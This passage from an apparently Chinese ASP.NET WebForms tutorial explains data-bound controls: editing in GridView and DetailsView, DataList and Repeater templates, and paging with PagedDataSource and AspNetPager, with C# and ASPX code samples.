ReadOnly&#x3D;&quot;true&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure></li><li><p>品牌名称在编辑时，合理的方式是用下拉列表框绑定数据库中所有品牌供用户选择。</p><ul><li><img data-src="../images/mdImages/image-20200617105625790.png" alt="image-20200617105625790"></li><li>修改<strong>EditItemTemplate</strong>模板，替换文本框为下拉列表框</li><li><img data-src="../images/mdImages/image-20200617105703069.png" alt="image-20200617105703069"></li><li><img data-src="../images/mdImages/image-20200617105710452.png" alt="image-20200617105710452"></li></ul></li><li><p>实物图在编辑时，用FileUpLoad控件替换TextBox，供用户选择要修改的实物图。</p><ul><li><p><img data-src="../images/mdImages/image-20200617105826213.png" alt="image-20200617105826213"></p></li><li><p>修改<strong>EditItemTemplate</strong>模板，替换文本框为文件上传控件<strong>FileUpLoad</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TemplateField HeaderText&#x3D;&quot;实物图&quot;&gt;</span><br><span class="line">     &lt;EditItemTemplate&gt;</span><br><span class="line">       &lt;asp:FileUpload ID&#x3D;&quot;fuPic&quot; runat&#x3D;&quot;server&quot; Width&#x3D;&quot;190&quot; Height&#x3D;&quot;30&quot; &#x2F;&gt;</span><br><span class="line">       &lt;asp:HiddenField ID&#x3D;&quot;hfPic&quot; runat&#x3D;&quot;server&quot; </span><br><span class="line">          Value&#x3D;&#39;&lt;%# Eval(&quot;Picture&quot;)%&gt;&#39; &#x2F;&gt;</span><br><span class="line">      &lt;&#x2F;EditItemTemplate&gt;</span><br><span class="line">      &lt;ItemTemplate&gt;</span><br><span class="line">        &lt;asp:Image ID&#x3D;&quot;Image1&quot; runat&#x3D;&quot;server&quot;</span><br><span class="line">         ImageUrl&#x3D;&#39;&lt;%# Eval(&quot;Picture&quot;, &quot;~&#x2F;images&#x2F;&#123;0&#125;&quot;) %&gt;&#39; </span><br><span class="line">Height&#x3D;&quot;80px&quot; Width&#x3D;&quot;100px&quot;  &#x2F;&gt;</span><br><span class="line">      &lt;&#x2F;ItemTemplate&gt;</span><br><span class="line"> &lt;&#x2F;asp:TemplateField&gt;</span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200617105911612.png" alt="image-20200617105911612"></p></li></ul></li><li><p>单击处于编辑状态行中的“更新”按钮，会触发<strong>GridView</strong>的<strong>RowUpdating</strong>事件，编写该事件的处理程序，实现如果用户选择了新的实物图那么上传图片到服务器和把数据更新到数据库中的功能。</p></li><li><p>单击处于编辑状态行中的“取消”按钮，会触发<strong>GridView</strong>的<strong>RowCancelingEdit</strong>事件，编写该事件的处理程序，实现取消编辑状态的功能。</p></li></ol></li></ul><h4><span id="2-高亮显示鼠标悬浮的行数据">2. 高亮显示鼠标悬浮的行数据</span></h4><ul><li><p>高亮显示鼠标悬浮的行数据其实就是改变行的背景色。</p></li><li><p><img data-src="../images/mdImages/image-20200617110043849.png" alt="image-20200617110043849"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;绑定每条记录时</span><br><span class="line">    protected void gvCars_RowDataBound(object sender, GridViewRowEventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (e.Row.RowType &#x3D;&#x3D; DataControlRowType.DataRow)</span><br><span class="line">        &#123;</span><br><span class="line">         &#x2F;&#x2F;为了实现鼠标离开时恢复背景色，使用currentcolor变量保存行本来的背景色        e.Row.Attributes.Add(&quot;onmouseover&quot;,</span><br><span class="line">                                   &quot;currentcolor&#x3D;this.style.backgroundColor;</span><br><span class="line">                                   this.style.backgroundColor&#x3D;&#39;#6699ff&#39;;&quot;);</span><br><span class="line">  e.Row.Attributes.Add(&quot;onmouseout&quot;,                                    &quot;this.style.backgroundColor&#x3D;currentcolor;&quot;);</span><br><span class="line"> </span><br><span class="line">            &#x2F;&#x2F;其他代码省略</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="3-detailsview控件">3. DetailsView控件</span></h4><ul><li><p><strong>DetailsView</strong>控件以表格形式（table标签）一次仅显示数据源的单条记录，并且table标签下的每行（tr标签）表示记录中的一个字段。</p></li><li><p><img data-src="../images/mdImages/image-20200617110204329.png" alt="image-20200617110204329"></p></li><li><p>使用<strong>DetailsView</strong>控件完成车型的详细页面的步骤：</p><ol><li><p>在数据访问层和业务逻辑层，添加方法封装根据编号查询车型的功能。</p><ul><li><img data-src="../images/mdImages/image-20200617110336449.png" alt="image-20200617110336449"></li></ul></li><li><p>在页面的后置代码中，<strong>DetailsView</strong>控件绑定数据源的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> CarManager cm &#x3D; new CarManager();</span><br><span class="line">    public void bindCar(int id)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">           List&lt;Car&gt; cars&#x3D;cm.GetCarsById(id); </span><br><span class="line">           dvCar.DataSource &#x3D; cars;&#x2F;&#x2F;设置需要检索的数据项</span><br><span class="line">           dvCar.DataBind();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">          Page.ClientScript.RegisterStartupScript(this.GetType(), &quot;myScript&quot;, &quot;alert(&#39;&quot; + ex.Message + &quot;&#39;)&quot;, true); &#x2F;&#x2F;弹出消息框，提示异常信息</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><img data-src="../images/mdImages/image-20200617110437096.png" alt="image-20200617110437096"></li></ul></li></ol></li><li><p>手动创建<strong>DetailsView</strong>控件的行</p><ul><li><p><strong>DetailsView</strong>控件能自动产生行，数据行有两列，第一列显示记录的字段名，第二列显示该字段的数据。</p></li><li><p>设置“<strong>AutoGenerateRows</strong>”属性为“<strong>false</strong>”，手动添加每行，行的类型如同<strong>GridView</strong>字段的类型。</p></li><li><p><img data-src="../images/mdImages/image-20200617110625845.png" alt="image-20200617110625845"></p></li><li><p>同<strong>GridView</strong>控件一样，通过编辑其<strong>EditItemTemplate</strong>来控制编辑功能界面中显示的控件。</p></li><li><p>单击“编辑”按钮，会触发<strong>DetailsView</strong>控件的<strong>ModeChanging</strong>事件，编写此事件的处理程序，完成使<strong>DetailsView</strong>控件切换到编辑状态的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> protected void dvCar_ModeChanging(object sender, DetailsViewModeEventArgs e) &#123;</span><br><span class="line">        &#x2F;&#x2F;当点击&quot;编辑”时，e.NewMode传递给ChangeMode方法，切换到编辑界面</span><br><span class="line">        dvCar.ChangeMode(e.NewMode);</span><br><span class="line">        bindCar(Convert.ToInt32(dvCar.DataKey.Value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200617110752130.png" alt="image-20200617110752130"></p></li><li><p>当单击编辑状态下的“更新”按钮，会触发DetailsView控件的ItemUpdating事件。</p></li><li><p>编写事件的处理程序完成如果用户选择了新的实物图那么上传图片到服务器和把数据更新到数据库中的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected void dvCar_ItemUpdating(object sender, DetailsViewUpdateEventArgs e)</span><br><span class="line"> &#123;</span><br><span class="line">       &#x2F;&#x2F;代码省略……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>为了完成DetailsView控件的插入数据的功能，需要编辑“InsertItemTemplate”模板，并添加验证控件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;InsertItemTemplate&gt;</span><br><span class="line">         &lt;asp:TextBox ID&#x3D;&quot;txtAddCarName&quot; runat&#x3D;&quot;server&quot; </span><br><span class="line">                  Text&#x3D;&#39;&lt;%# Bind(&quot;CarName&quot;) %&gt;&#39;&gt;</span><br><span class="line">        &lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">          &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator1&quot;                               runat&#x3D;&quot;server&quot; </span><br><span class="line">            ErrorMessage&#x3D;&quot;车型名称必填&quot; </span><br><span class="line">            Text&#x3D;&quot;*&quot; ControlToValidate&#x3D;&quot;txtAddCarName&quot;&gt;</span><br><span class="line">        &lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">&lt;&#x2F;InsertItemTemplate&gt;</span><br></pre></td></tr></table></figure></li><li><p>在“<strong>DetailCar.aspx</strong>”页面，单击“添加”按钮，会触发执行<strong>DetailsView</strong>控件的<strong>ModeChanging</strong>事件方法。</p></li><li><p>在事件方法中，切换<strong>DetailsView</strong>的状态是添加数据状态，即显示的是<strong>InsertItemTemplate</strong>模板的内容。</p></li><li><p><img data-src="../images/mdImages/image-20200617110909364.png" alt="image-20200617110909364"></p></li><li><p>在<strong>DetailsView</strong>处于添加数据状态时， 单击“增加”按钮，当验证都通过后，会触发<strong>DetailsView</strong>控件的<strong>ItemInserting</strong>事件。</p></li><li><p>编写该事件的程序处理，实现上传实物图到到服务器和插入新记录到数据库的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected void dvCar_ItemInserting(object sender, DetailsViewInsertEventArgs e)</span><br><span class="line"> &#123;</span><br><span class="line">      &#x2F;&#x2F;代码省略……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4><span id="总结">总结</span></h4><ul><li><p><strong>RowDataBound</strong>事件在 <strong>GridView</strong> 控件中的某个行被绑定到一个数据记录时发生。此事件通常用于在某个行被绑定到数据时修改该行的内容。</p></li><li><p><strong>RowEditing</strong>事件在单击 <strong>GridView</strong> 控件内某一行的 <strong>Edit</strong> 按钮时发生，实现使所在的行处于编辑状态的功能。</p></li><li><p><strong>RowUpdating</strong>事件在单击 <strong>GridView</strong> 控件内某一行的 <strong>Update</strong> 按钮时发生，实现把新的数据更新到数据库中的功能。</p></li><li><p><strong>RowCancelingEdit</strong>事件在单击 <strong>GridView</strong> 控件内某一行的 <strong>Cancel</strong> 按钮时发生，实现使 <strong>GridView</strong> 控件退出编辑模式。</p></li><li><p>与修改GridView的显示界面类似，在<strong>DetailsView</strong>中可以通过修改Fields属性来增加和减少显示的字段、修改字段的标题，使用模板页指定<strong>DetailsView</strong>控件处于不同状态下的内容。</p></li><li><p><strong>DetailsView</strong>有三种显示状态：Edit编辑状态、<strong>Insert</strong>添加状态和<strong>ReadOnly</strong>只读状态，三种状态保存在枚举类型<strong>DetailsViewMode</strong>中。调用<strong>DetailsView</strong>的<strong>ChangeMode</strong>方法并传递状态枚举值时，将 <strong>DetailsView</strong> 控制切换到指定的模式</p></li><li><p><strong>ModeChanging</strong>事件是在单击<strong>DetailsView</strong>控件的“Edit”按钮时发生，实现使<strong>DetailsView</strong>控件切换到编辑状态的功能。</p></li><li><p><strong>ItemUpdating</strong>事件是在单击<strong>DetailsView</strong>控件的编辑状态下的“<strong>Update</strong>”按钮时发生，实现把数据更新到数据库中的功能。</p></li><li><p><strong>ItemInserting</strong>事件是在单击<strong>DetailsView</strong>处于添加数据状态下的 “<strong>Insert</strong>”按钮时发生，实现添加新记录到数据库的功能。</p></li></ul><h2><span id="第九章-使用datalist和repeater绑定数据">第九章 使用DataList和Repeater绑定数据</span></h2><h3><span id="1-datalist控件的使用">1. DataList控件的使用</span></h3><ul><li><p>在用ASP.NET开发Web应用程序时，<strong>DataList</strong>是非常重要的数据绑定控件。</p></li><li><p><img data-src="../images/mdImages/image-20200617111506986.png" alt="image-20200617111506986"></p></li><li><p><img data-src="../images/mdImages/image-20200617111525702.png" alt="image-20200617111525702"></p></li><li><p>展示每个车型的结构都是重复的，只是数据不同。 </p></li><li><p>每个车型的信息用一个复杂的小表格进行布局。</p></li><li><p><img data-src="../images/mdImages/image-20200617111646414.png" alt="image-20200617111646414"></p></li><li><p><strong>DataList</strong>控件可用于创建模板化的列表数据，可用于设计任何重复结构中的数据。</p></li><li><table><thead><tr><th>属性名称</th><th>说 明</th></tr></thead><tbody><tr><td>ItemTemplate</td><td>项模板，标记了每项显示的内容</td></tr><tr><td>AlternatingItemTemplate</td><td>交替项模板，可设置交替行显示不同的风格，不设置时，与项模板相同</td></tr><tr><td>SelectedItemTemplate</td><td>选中项模板，设置选中后的特殊样式</td></tr><tr><td>EditItemTemplate</td><td>编辑项模板</td></tr><tr><td>HeaderTemplate  和  FooterTemplate</td><td>页眉和页脚的模板</td></tr><tr><td>SeparatorTemplate</td><td>分隔符模板，一般用&lt;hr&gt;(一条直线)</td></tr></tbody></table></li></ul><ol><li><p>将<strong>DataList</strong>控件拖入到前台页面“<strong>CarList.aspx</strong>”中，并设置其ID属性为“<strong>dlCars</strong>“。</p></li><li><p>在后置代码中编写<strong>DataList</strong>绑定数据源的代码。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CarManager cm &#x3D; new CarManager();</span><br><span class="line">    private void bindCars()</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;&#x2F;&#x2F;调用业务逻辑层查询所有车型信息的方法</span><br><span class="line">            List&lt;Car&gt; cars &#x3D; cm.GetCars();</span><br><span class="line">            dlCars.DataSource &#x3D; cars;</span><br><span class="line">            dlCars.DataBind();</span><br><span class="line">        &#125;</span><br><span class="line">       ……</span><br><span class="line">&#125;</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!IsPostBack)</span><br><span class="line">        &#123;</span><br><span class="line">            bindCars();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>为<strong>DataList</strong>绑定数据源后，显然它不像<strong>GridView</strong>控件那样会自动产生列从而显示一个表格，而是需要编辑模板。</p><ul><li><img data-src="../images/mdImages/image-20200617111837221.png" alt="image-20200617111837221"></li></ul></li><li><p>编辑<strong>DataList</strong>的<strong>ItemTemplate</strong>和<strong>SeparatorTemplate</strong>模板。</p><p>●<img data-src="../images/mdImages/image-20200617111928032.png" alt="image-20200617111928032"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:DataList ID&#x3D;&quot;dlCars&quot; runat&#x3D;&quot;server&quot;&gt;</span><br><span class="line">            &lt;ItemTemplate&gt;</span><br><span class="line">              &lt;table class&#x3D;&quot;tblCar&quot;&gt;</span><br><span class="line">                ……</span><br><span class="line">             &lt;&#x2F;table&gt;</span><br><span class="line">            &lt;&#x2F;ItemTemplate&gt;</span><br><span class="line">             &lt;SeparatorTemplate&gt;&lt;hr &#x2F;&gt;&lt;&#x2F;SeparatorTemplate&gt;</span><br><span class="line">        &lt;&#x2F;asp:DataList&gt;</span><br></pre></td></tr></table></figure></li></ol><h3><span id="2-datalist控件的重要属性">2. DataList控件的重要属性</span></h3><table><thead><tr><th>属性名称</th><th>说 明</th></tr></thead><tbody><tr><td>RepeatColumns</td><td>显示的列数。默认为0，表示单行或单列显示</td></tr><tr><td>RepeatDirection</td><td>获取或设置DataList的显示方向，Horizontal：水平，Vertical：垂直</td></tr><tr><td>DataKeyField</td><td>获取或设置指定的数据源中的键字段</td></tr><tr><td>DataKeys</td><td>获取每个记录的键值</td></tr></tbody></table><ul><li>设置<strong>DataList</strong>的<strong>RepeatDirection</strong>属性为“<strong>Horizontal</strong>”， <strong>RepeatColumns</strong>属性为“3”。</li><li><img data-src="../images/mdImages/image-20200617112017846.png" alt="image-20200617112017846"></li><li><strong>DataList</strong>控件没有内置分页的功能，它将显示所有数据源提供的所有数据。</li><li>为<strong>DataList</strong>控件分页需要借助于<strong>PagedDataSource</strong>控件。</li><li><strong>PagedDataSource</strong>控件的作用是将其他数据源提供的数据进行分页后提供给数据绑定控件。</li></ul><h3><span id="3-实现datalist控件的分页">3. 实现DataList控件的分页</span></h3><ul><li><p><strong>DataList</strong>控件使用<strong>PagedDataSource</strong>完成分页需要实现以下4个步骤：</p><ol><li><p>创建<strong>PagedDataSource</strong>控件实例。</p></li><li><p>设置<strong>PagedDataSource</strong>实例的<strong>AllowPaging</strong>、<strong>PageSize</strong>、<strong>CurrentPageIndex</strong>和<strong>DataSource</strong>属性。</p></li><li><p>设置<strong>DataList</strong>控件的<strong>DataSource</strong>属性值为<strong>PagedDataSource</strong>实例。</p></li><li><p>调用<strong>DataList</strong>控件的<strong>DataBind</strong>方法。</p></li></ol></li><li><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>CurrentPageIndex</td><td>当前页码</td></tr><tr><td>PageCount</td><td>总页数</td></tr><tr><td>Count</td><td>总记录数</td></tr><tr><td>PageSize</td><td>每页记录数</td></tr><tr><td>DataSource</td><td>数据源</td></tr><tr><td>Allowpaging</td><td>是否实现自动分页功能</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200617112205956.png" alt="image-20200617112205956"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private void bindCars()</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;Car&gt; cars &#x3D; cm.GetCars();</span><br><span class="line">            PagedDataSource pds &#x3D; new PagedDataSource();</span><br><span class="line">            pds.DataSource &#x3D; cars;</span><br><span class="line">            pds.AllowPaging &#x3D; true;</span><br><span class="line">            pds.PageSize &#x3D; 3;</span><br><span class="line">            pds.CurrentPageIndex &#x3D; 0;</span><br><span class="line">            dlCars.DataSource &#x3D; pds;</span><br><span class="line">            dlCars.DataBind();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Page.ClientScript.RegisterStartupScript(this.GetType(), &quot;myScript&quot;, &quot;alert(&#39;&quot; + ex.Message + &quot;&#39;)&quot;, true);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>DataList</strong>显示了第1页的3项数据，为了完成翻页的功能，需要添加翻页使用的按钮或者链接。</p></li><li><p>为了简化翻页，我们使用<strong>AspNetPager</strong>控件。</p><ol><li><p>从网络上下载“<strong>AspNetPager.dll</strong>”。</p></li><li><p>在<strong>Visual Studio</strong>的工具箱中单击鼠标右键，在菜单中选择“选择项” &gt;  “选择工具箱项” &gt;  “浏览” ，选择下载的“<strong>AspNetPager.dll</strong>”文件 &gt; “确定”。</p></li><li><p>从工具箱中拖出<strong>AspNetPager</strong>控件到页面中。</p></li></ol></li><li><p>源文件在Page指令下自动产生注册<strong>AspNetPager</strong>的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Register Assembly&#x3D;&quot;AspNetPager&quot; Namespace&#x3D;&quot;Wuqi.Webdiyer&quot; TagPrefix&#x3D;&quot;webdiyer&quot; %&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>AspNetPager</strong>控件的标签代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;webdiyer:AspNetPager ID&#x3D;&quot;AspNetPager1&quot; runat&#x3D;&quot;server&quot;&gt;</span><br><span class="line"> &lt;&#x2F;webdiyer:AspNetPager&gt;</span><br></pre></td></tr></table></figure></li><li><p>为了实现AspNetPager控件分页导航的功能，必须初始化它的相关属性。</p></li><li><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>CurrentPageIndex</td><td>获取或设置当前显示页的索引，从1开始</td></tr><tr><td>PageSize</td><td>获取或设置每页显示的项数</td></tr><tr><td>RecordCount</td><td>获取或设置总记录条数</td></tr></tbody></table></li><li><p><strong>AspNetPager</strong>控件通过<strong>PageSize</strong>和<strong>ReCordCount</strong>属性来计算显示所有数据需要的总页数，并保存到<strong>AspNetPager</strong>控件的<strong>PageCount</strong>属性中。</p></li><li><p><img data-src="../images/mdImages/image-20200617112517116.png" alt="image-20200617112517116"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"> protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!IsPostBack)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;初始化AspNetPager控件的属性</span><br><span class="line">            AspNetPager1.CurrentPageIndex &#x3D; 0;&#x2F;&#x2F;当前页码</span><br><span class="line">            AspNetPager1.PageSize &#x3D; 3;&#x2F;&#x2F;每页显示的项数</span><br><span class="line">         List&lt;Car&gt; cars &#x3D; cm.GetCars();</span><br><span class="line">         AspNetPager1.RecordCount &#x3D; cars.Count ;&#x2F;&#x2F;设置总记录数</span><br><span class="line">            bindCars();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200617112553796.png" alt="image-20200617112553796"></p></li><li><p>当单击页码时，会触发<strong>AspNetPager</strong>控件的<strong>PageChanging</strong>事件，编写该事件的处理程序，实现设置<strong>AspNetPager</strong>控件的当前页码并重新绑定<strong>DataList</strong>的数据。</p></li><li><p><img data-src="../images/mdImages/image-20200617112613421.png" alt="image-20200617112613421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">protected void AspNetPager1_PageChanging(object src, Wuqi.Webdiyer.PageChangingEventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">        AspNetPager1.CurrentPageIndex &#x3D; e.NewPageIndex;</span><br><span class="line">        bindCars();</span><br><span class="line">&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li></ul><h3><span id="4-repeater控件的使用">4. Repeater控件的使用</span></h3><ul><li><p><strong>Repeater</strong>控件专门用于精确内容的显示，它也是基于模板的方式，不过它不会自动生成任何用于布局的代码。</p></li><li><p><strong>Repeater</strong>控件甚至没有一个默认的外观，它完全是通过模板来控制。而且也只能通过源代码视图进行模板的编辑。</p></li><li><p><strong>Repeater</strong>控件和<strong>DataList</strong>控件相比，可用模板更少，没有编辑和选择模板。 </p></li><li><p><img data-src="../images/mdImages/image-20200617112710962.png" alt="image-20200617112710962"></p></li><li><p>使用<strong>Repeater</strong>控件呈现数据</p><ul><li><p><strong>GridView</strong>和<strong>DataList</strong>自动生成&lt;<strong>table</strong>&gt;标签，但是<strong>Repeater</strong>控件不会自动生成任何HTML标签，所以带来了效率上的提升，也使精确展示内容成为可能。</p></li><li><p><img data-src="../images/mdImages/image-20200617112828793.png" alt="image-20200617112828793"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:Repeater ID&#x3D;&quot;repeaterCar&quot; runat&#x3D;&quot;server&quot;&gt;</span><br><span class="line">            &lt;HeaderTemplate&gt;</span><br><span class="line">                &lt;table class&#x3D;&quot;cartab&quot;&gt; ……</span><br><span class="line">           &lt;&#x2F;HeaderTemplate&gt;</span><br><span class="line">            &lt;ItemTemplate&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;td&gt;&lt;%#Eval(&quot;CarName&quot;) %&gt;&lt;&#x2F;td&gt;</span><br><span class="line">                    ……</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&#39;DetailCar.aspx?CarId&#x3D;&lt;%#Eval(&quot;CarId&quot;) %&gt;&#39;&gt;&lt;img src&#x3D;&#39;&lt;%# Eval(&quot;Picture&quot;, &quot;images&#x2F;&#123;0&#125;&quot;) %&gt;&#39;  width&#x3D;&quot;100&quot; height&#x3D;&quot;80&quot;&#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">                    &lt;td&gt;</span><br><span class="line">                        &lt;asp:Button ID&#x3D;&quot;btnDel&quot; runat&#x3D;&quot;server&quot; Text&#x3D;&quot;删除&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;asp:Button ID&#x3D;&quot;btnEdit&quot; runat&#x3D;&quot;server&quot; Text&#x3D;&quot;编辑&quot; &#x2F;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;</span><br><span class="line">      &lt;&#x2F;ItemTemplate&gt;</span><br><span class="line">            &lt;AlternatingItemTemplate&gt;</span><br><span class="line">                   &lt;tr class&#x3D;“atrow”&gt;</span><br><span class="line">                      ……</span><br><span class="line">                   &lt;&#x2F;tr&gt;</span><br><span class="line">            &lt;&#x2F;AlternatingItemTemplate&gt;</span><br><span class="line">            &lt;FooterTemplate&gt;</span><br><span class="line">                &lt;&#x2F;table&gt;</span><br><span class="line">            &lt;&#x2F;FooterTemplate&gt;</span><br><span class="line">        &lt;&#x2F;asp:Repeater&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>一个完整的表格标签&lt;table&gt;、&lt;tr&gt;、&lt;td&gt;可以分散到Repeater标签的各个模板中。</strong></p></li><li><p><strong>Repeater</strong>控件在呈现数据时没有内置分页功能，它将呈现数据源提供的所有数据。</p></li><li><p>实现<strong>Repeater</strong>的分页方法和<strong>DataList</strong>一样，只不过呈现数据的载体不一样而已。</p></li></ul></li><li><p>处理<strong>Repeater</strong>控件中的按钮事件</p><ul><li><p><strong>Repeater</strong>控件不支持编辑、删除、排序等功能，所有的事件必须自行编写代码处理。</p></li><li><p>当点击<strong>Repeater</strong>中的按钮控件时会触发<strong>Repeater</strong>控件的<strong>ItemCommand</strong>事件。 </p></li><li><p>为了标识单击的按钮，可以设置按钮的<strong>CommandName</strong>属性。 </p></li><li><p>在进行删除或者编辑操作时，都需要本行车型的编号，可以设置按钮的<strong>CommandArgument</strong>属性来保存本行的车型编号。</p></li><li><p><img data-src="../images/mdImages/image-20200617113000123.png" alt="image-20200617113000123"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:Button ID&#x3D;&quot;btnDel&quot; runat&#x3D;&quot;server&quot; Text&#x3D;&quot;删除&quot; 